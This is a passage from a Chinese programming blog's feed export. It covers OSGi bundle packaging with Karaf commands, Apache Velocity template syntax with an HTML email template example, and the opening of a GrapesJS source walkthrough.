class="comment">&lt;!-- 服务导出的包，client只需要应用服务的pom即可使用服务；client无需导出包则不需要此配置 --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">Export-Package</span>&gt;</span>com.baeldung.osgi.sample.service.definition<span class="tag">&lt;/<span class="name">Export-Package</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                    <span class="comment">&lt;!-- 导入包 --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">Import-Package</span>&gt;</span></span><br><span class="line">                        cn.aezo.core.*,</span><br><span class="line">                        cn.aezo.test.service,</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">Import-Package</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!-- 动态导入包 --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">DynamicImport-Package</span>&gt;</span></span><br><span class="line">                        javax.*,</span><br><span class="line">                        org.osgi.*,</span><br><span class="line">                        org.xml.*,</span><br><span class="line">                        org.w3c.*</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">DynamicImport-Package</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">instructions</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>上述打包出来的MANIFEST.MF文件如下</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: <span class="number">1.0</span></span><br><span class="line">Bnd-LastModified: <span class="number">1612846013882</span></span><br><span class="line">Build-Jdk: <span class="number">1.8</span>.0_111</span><br><span class="line">Built-By: smalle</span><br><span class="line">Bundle-Activator: com.baeldung.osgi.sample.service.implementation.Greete</span><br><span class="line"> rImpl</span><br><span class="line">Bundle-ManifestVersion: <span class="number">2</span></span><br><span class="line">Bundle-Name: osgi-intro-sample-service</span><br><span class="line">Bundle-SymbolicName: cn.aezo.osgi-intro-sample-service</span><br><span class="line">Bundle-Version: <span class="number">1.0</span>.0.SNAPSHOT</span><br><span class="line">Created-By: Apache Maven Bundle Plugin</span><br><span class="line">Export-Package: com.baeldung.osgi.sample.service.definition;version=<span class="string">"1.0</span></span><br><span class="line"><span class="string"> .0.SNAPSHOT"</span></span><br><span class="line">Import-Package: com.baeldung.osgi.sample.service.definition,org.osgi.fra</span><br><span class="line"> mework;version=<span class="string">"[1.8,2)"</span></span><br><span class="line">Require-Capability: osgi.ee;filter:=<span class="string">"(&amp;(osgi.ee=JavaSE)(version=1.8))"</span></span><br><span class="line">Tool: Bnd-<span class="number">3.3</span>.0.201609221906</span><br></pre></td></tr></table></figure><ul><li>测试</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在本项目目录启动</span></span><br><span class="line">karaf</span><br><span class="line"></span><br><span class="line"><span class="comment">## 简单使用</span></span><br><span class="line"><span class="comment"># 打包项目</span></span><br><span class="line">mvn clean install</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装组件. 显示如 Bundle ID: 59，说明Karaf从本地Maven存储库加载到组件</span></span><br><span class="line">bundle:install mvn:cn.aezo/osgi-intro-sample-activator/1.0-SNAPSHOT</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动上述组件. 显示 Hello World.</span></span><br><span class="line">bundle:start 59</span><br><span class="line"></span><br><span class="line"><span class="comment"># 停止上述组件. 显示 Goodbye World.</span></span><br><span class="line">bundle:stop 59</span><br><span class="line"></span><br><span class="line"><span class="comment"># 卸载上述组件</span></span><br><span class="line">bundle:uninstall 59</span><br><span class="line"></span><br><span class="line"><span class="comment">## 基于服务调用</span></span><br><span class="line"><span class="comment"># 安装服务端和客户端</span></span><br><span class="line">install mvn:cn.aezo/osgi-intro-sample-service/1.0-SNAPSHOT  <span class="comment"># Bundle ID: 60</span></span><br><span class="line">install mvn:cn.aezo/osgi-intro-sample-client/1.0-SNAPSHOT   <span class="comment"># Bundle ID: 61</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动客户端(什么都不会发生，因为客户端启动后正在等待服务)</span></span><br><span class="line">start 61</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动服务端. 返回如下信息</span></span><br><span class="line"><span class="comment"># Registering service.</span></span><br><span class="line"><span class="comment"># Notification of service registered.</span></span><br><span class="line"><span class="comment"># Hello John</span></span><br><span class="line">start 60</span><br></pre></td></tr></table></figure><h2 id="idea使用"><a href="#idea使用" class="headerlink" title="idea使用"></a>idea使用</h2><ul><li>配置. 参考：<a href="https://www.jb51.net/article/160461.htm" target="_blank" rel="noopener">https://www.jb51.net/article/160461.htm</a><ul><li>下载Felix</li><li>File - Settings - Languages &amp; Frameworks - OSGi Framework Instances - 导入Felix</li><li>File - Settings - Languages &amp; Frameworks - OSGi</li><li>启动配置：Edit configuration - 新建一个OSGi启动配置</li></ul></li></ul><h2 id="karaf容器"><a href="#karaf容器" class="headerlink" title="karaf容器"></a>karaf容器</h2><h3 id="karaf命令"><a href="#karaf命令" class="headerlink" title="karaf命令"></a>karaf命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls      <span class="comment"># 列举bundle</span></span><br><span class="line">    <span class="comment"># ls 100 # 列举某个bundle</span></span><br><span class="line">start   <span class="comment"># 启动bundle(调用bundle的BundleActivator.start方法)</span></span><br></pre></td></tr></table></figure><hr><p>参考文章</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Java其他插件化开发(OSGi文档较少，2021-02弃用)&lt;/strong&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href
      
    
    </summary>
    
      <category term="java" scheme="http://blog.aezo.cn/categories/java/"/>
    
    
  </entry>
  
  <entry>
    <title>Velocity</title>
    <link href="http://blog.aezo.cn/2020/12/16/java/velocity/"/>
    <id>http://blog.aezo.cn/2020/12/16/java/velocity/</id>
    <published>2020-12-16T12:03:00.000Z</published>
    <updated>2022-12-15T05:42:30.904Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li><a href="http://velocity.apache.org/" target="_blank" rel="noopener">官网</a>、<a href="http://velocity.apache.org/engine/devel/user-guide.html" target="_blank" rel="noopener">Doc-user</a>、<a href="http://velocity.apache.org/engine/devel/developer-guide.html" target="_blank" rel="noopener">Doc-developer</a></li><li>依赖</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.velocity<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>velocity-engine-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="变量取值"><a href="#变量取值" class="headerlink" title="变量取值"></a>变量取值</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 根据变量从map中取值 --&gt;</span></span><br><span class="line">$!&#123;myMap.key&#125;</span><br><span class="line">$!&#123;myMap['key']&#125;</span><br><span class="line">$!&#123;myMap.get($!&#123;relate.toEntityId&#125;)&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 根据变量从list中取值和获取数组大小 --&gt;</span></span><br><span class="line">$!&#123;myList.get(0)&#125;</span><br><span class="line">$!&#123;myList.size()&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 默认值 --&gt;</span></span><br><span class="line">$&#123;name|'John Doe'&#125;</span><br></pre></td></tr></table></figure><h2 id="控制语句"><a href="#控制语句" class="headerlink" title="控制语句"></a>控制语句</h2><h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">## 循环map</span><br><span class="line">#foreach($item in $!softTypeMap.entrySet())</span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"$!&#123;item.key&#125;"</span>&gt;</span>$!&#123;item.value&#125;<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">#end</span><br><span class="line"></span><br><span class="line">## 判断循环最后一个。如果不是最后一个元素，则添加逗号</span><br><span class="line">#foreach($column in $columns)</span><br><span class="line">    $&#123;column.columnName&#125;#if($foreach.hasNext),#end</span><br><span class="line"></span><br><span class="line">    $foreach.index //下标</span><br><span class="line">    $foreach.count //数组长度</span><br><span class="line">    $foreach.first </span><br><span class="line">    $foreach.last</span><br><span class="line">    $foreach.hasNext //是否是最后一个</span><br><span class="line">    $velocityCount // 用作循环计数，初始值是1。这个变量的名字和初始值是在velocity.properties文件里配置的。最新版本已作废</span><br><span class="line">#end</span><br></pre></td></tr></table></figure><h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">## 这是注释</span><br><span class="line">#*</span><br><span class="line">  这是多行注释</span><br><span class="line">*#</span><br><span class="line"></span><br><span class="line">#foreach($field in $!&#123;table.fields&#125;)</span><br><span class="line">#if($!&#123;field.name&#125;)</span><br><span class="line">    #if($velocityCount==3 &amp;&amp; !$!&#123;field.keyFlag&#125;) ## Velocity中有一个变量 $velocityCount 用作循环计数，初始值是1。这个变量的名字和初始值是在velocity.properties文件里配置的</span><br><span class="line">        #break      ## 会跳出循环，类似break。continue功能只能通过if实现</span><br><span class="line">        #stop       ## 退出程序(跳出循环，也不会执行循环之后的程序)，类似exit</span><br><span class="line">    #end</span><br><span class="line"></span><br><span class="line">    ## 语句解析后不会出现空行，如下写法生成的注释排版不会乱；replaceAll为直接调用对象方法</span><br><span class="line">    /** </span><br><span class="line">    #if($!&#123;field.desc&#125;)</span><br><span class="line">     * 说明：$!&#123;field.desc.replaceAll("\n","；").replaceAll("\r","；")&#125;<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    #elseif($!&#123;field.comment&#125; != "")</span><br><span class="line">     * $!&#123;field.comment&#125;</span><br><span class="line">    #else</span><br><span class="line">     * ...</span><br><span class="line">    #end</span><br><span class="line">     */</span><br><span class="line"></span><br><span class="line">    ## 转义字符"."后进行分割字符串</span><br><span class="line">    #if("$!&#123;field.comment&#125;" != "")</span><br><span class="line">        #set($commentName = $!&#123;field.comment.replace("(x)", "").replace("（x）", "").split("\.").get(0).trim()&#125;)</span><br><span class="line">        // \$message ## 转义 $, 渲染出来为: // $message; 如果无此变量则无需转义</span><br><span class="line">    #end</span><br><span class="line"></span><br><span class="line">    #if($!&#123;field.comment&#125; &amp;&amp; $!&#123;field.comment&#125; != "")</span><br><span class="line">        ## 判空</span><br><span class="line">    #end</span><br><span class="line"></span><br><span class="line">    ## 关键字、符号可以连写，如`#else$string#end`。但是写成`#elseString#end`又无法识别，写成`#else String#end`会多出一个空格</span><br><span class="line">    #set($string = $!&#123;field.format&#125; + "String") ## 仅演示语法</span><br><span class="line">    private #if("$!&#123;field.format&#125;" == "number")Integer#else$string#end$!&#123;field.name&#125;;</span><br><span class="line">#end</span><br><span class="line">#end</span><br></pre></td></tr></table></figure><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul><li>导入外部文件</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- #parse 支持 velocity 标签. tpl为resources目录下文件夹 --&gt;</span></span><br><span class="line">#parse("/tpl/layout.vm")</span><br><span class="line"><span class="comment">&lt;!-- #include 不支持 velocity标签 --&gt;</span></span><br><span class="line">#include("/tpl/layout.vm")</span><br></pre></td></tr></table></figure><ul><li>调用静态方法，如<code>context.put(&quot;Math&quot;, Math.class);</code>：<a href="http://velocity.apache.org/engine/devel/developer-guide.html#support-for-static-classes" target="_blank" rel="noopener">http://velocity.apache.org/engine/devel/developer-guide.html#support-for-static-classes</a></li></ul><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><h3 id="邮件模板"><a href="#邮件模板" class="headerlink" title="邮件模板"></a>邮件模板</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"zh"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>$!&#123;subject&#125;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">    html &#123;</span></span><br><span class="line"><span class="undefined">      font-family: sans-serif;</span></span><br><span class="line"><span class="undefined">      -ms-text-size-adjust: 100%;</span></span><br><span class="line"><span class="undefined">      -webkit-text-size-adjust: 100%;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">    body &#123;</span></span><br><span class="line"><span class="undefined">      padding: 20px;</span></span><br><span class="line"><span class="undefined">      font-size: 14px;</span></span><br><span class="line"><span class="undefined">      margin: 0;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">    table &#123;</span></span><br><span class="line"><span class="undefined">      border-top: 1px solid #000000;</span></span><br><span class="line"><span class="undefined">      border-left: 1px solid #000000;</span></span><br><span class="line"><span class="undefined">      border-collapse: collapse;</span></span><br><span class="line"><span class="undefined">      /* table-layout: fixed;</span></span><br><span class="line"><span class="undefined">      word-wrap: break-word; */</span></span><br><span class="line"><span class="undefined">      /*列表会自动撑开，超过此宽度则会缩小字体从而完全显示(实际邮件中一般可点击放大查看)*/</span></span><br><span class="line"><span class="undefined">      width: 1000px;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">    th,</span></span><br><span class="line"><span class="undefined">    td &#123;</span></span><br><span class="line"><span class="undefined">      border-bottom: 1px solid #000000;</span></span><br><span class="line"><span class="undefined">      border-right: 1px solid #000000;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">    table tr:nth-child(odd) &#123;</span></span><br><span class="line"><span class="undefined">      background: #F4F4F4;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">    table tr:hover&#123;</span></span><br><span class="line"><span class="undefined">      background:#abdcff;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">此邮件为系统自动发出，请勿直接回复！</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h4</span>&gt;</span>$!&#123;subject&#125;（数据抓取时间：$!&#123;date&#125;）<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">#if("$!&#123;dataList&#125;" != "")</span><br><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tr</span> <span class="attr">style</span>=<span class="string">"background-color: #666; color: white;"</span>&gt;</span></span><br><span class="line">    #foreach($col in $!&#123;tableCols&#125;)</span><br><span class="line">      <span class="tag">&lt;<span class="name">th</span>&gt;</span>$!&#123;col&#125;<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    #end</span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  #foreach($item in $!&#123;dataList&#125;)</span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">      #foreach($col in $!&#123;tableCols&#125;)</span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>$!&#123;item.get($!&#123;col&#125;)&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      #end</span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  #end</span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">#end</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://velocity.apache.org/&quot; target=&quot;_blank&quot; rel=&quot;noope
      
    
    </summary>
    
      <category term="java" scheme="http://blog.aezo.cn/categories/java/"/>
    
    
      <category term="template" scheme="http://blog.aezo.cn/tags/template/"/>
    
  </entry>
  
  <entry>
    <title>GrapesJS可视化元素拖拽代码生成</title>
    <link href="http://blog.aezo.cn/2020/11/16/web/grapesjs/"/>
    <id>http://blog.aezo.cn/2020/11/16/web/grapesjs/</id>
    <published>2020-11-16T02:28:00.000Z</published>
    <updated>2021-08-31T06:07:20.367Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li><a href="https://github.com/artf/grapesjs" target="_blank" rel="noopener">github</a></li><li>GrapesJS 是一个免费开源的 Web 模板编辑器，可进行元素拖拽，包括元素的常用属性设置，从而生成HTML页面</li><li>GrapesJS 引入了 backone.js，参考<a href="/_posts/web/backone-underscore-js.md">backone-underscore-js.md</a></li></ul><h2 id="初始化渲染源码解析"><a href="#初始化渲染源码解析" class="headerlink" title="初始化渲染源码解析"></a>初始化渲染源码解析</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br></pre></td><td class="code"><pre><span class="line">grapesjs.init(&#123;...&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// index.js</span></span><br><span class="line">init(config = &#123;&#125;) 